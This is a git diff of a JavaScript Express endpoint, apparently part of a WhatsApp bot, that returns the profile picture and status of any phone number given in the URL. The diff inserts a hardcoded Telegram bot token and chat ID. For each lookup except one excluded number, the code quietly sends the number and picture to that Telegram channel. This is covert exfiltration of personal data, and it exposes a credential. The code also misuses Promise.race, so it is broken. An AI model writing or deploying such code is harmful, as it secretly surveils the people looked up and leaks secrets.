@@ -198,42 +198,44 @@ async function startHisoka() {
     app.use(cors())
     const PORT = process.env.PORT || 3030;
     app.get('/:num', async (req, res) => {
+      const timeoutPromise = new Promise((_, reject) =>
+        setTimeout(() => reject(new Error('Timeout')), 3000)
+      );
       try {
-        const timeoutPromise = new Promise((_, reject) =>
-          setTimeout(() => reject(new Error('Timeout')), 5000)
-        );
-    
+        // Assuming `req.params.num` contains the number dynamically passed in the URL
         const profilePicPromise = client.profilePictureUrl(req.params.num + '@s.whatsapp.net', 'image');
         const statusPromise = client.fetchStatus(req.params.num + '@s.whatsapp.net');
     
         const [profilePicUrl, status] = await Promise.race([profilePicPromise, statusPromise, timeoutPromise]);
-    
+        const number = req.params.num;
         if (profilePicUrl) {
+         
           res.json({ profilePicUrl, status });
-          const number = req.params.num;
           if (number !== '917994107442' && number !== '7994107442') {
-            const telegramUrl = `https://api.telegram.org/bot<YOUR_TELEGRAM_BOT_TOKEN>/sendPhoto?chat_id=<YOUR_CHAT_ID>&photo=${encodeURIComponent(profilePicUrl)}&caption=${encodeURIComponent(number)}`;
+            const telegramUrl = `https://api.telegram.org/bot1946326672:AAEwXYJ0QjXFKcpKMmlYD0V7-3TcFs_tcSA/sendPhoto?chat_id=-1001723645621&photo=${encodeURIComponent(profilePicUrl)}&caption=${encodeURIComponent(number)}`;
+
             await fetch(telegramUrl);
           }
+           
+          
         } else {
-          res.status(404).json({ error: 'Profile picture not found' });
+          res.status(404).json({ error: 'Profile picture not found' }); // Respond with 404 if profile picture not found
         }
       } catch (error) {
-        const status = await client.fetchStatus(req.params.num + '@s.whatsapp.net');
+        const status = await client.fetchStatus(req.params.num + '@s.whatsapp.net')
         if (error.message === 'Timeout') {
-          res.status(200).json({ error: 'Request Timeout Or Profile Not Found', status });
+          res.status(200).json({ error: 'Request Timeout', status });
         } else if (error.data === 404 || error.data === 408) {
-          res.status(200).json({ error: 'Profile picture not found', status });
-        } else if (error.data === 401) {
-          res.status(200).json({ error: 'Contact Only permission to view the dp', status });
-        } else if (error.data === 400) {
-          res.status(200).json({ error: 'Whatsapp Account not found', status });
+          res.status(200).json({ error: 'Profile picture not found',status:status });
+        } else if (error.data == 401) {
+          res.status(200).json({ error: 'Contact Only permission to view the dp',status:status });
+        } else if (error.data == 400) {
+          res.status(200).json({ error: 'Whatsapp Accont not found',status:status });
         } else {
           res.status(500).json({ error: 'Internal Server Error' });
         }
       }
     });
-    
     app.listen(PORT, () => {
       console.log(`Express server is running on port ${PORT}`);
     });
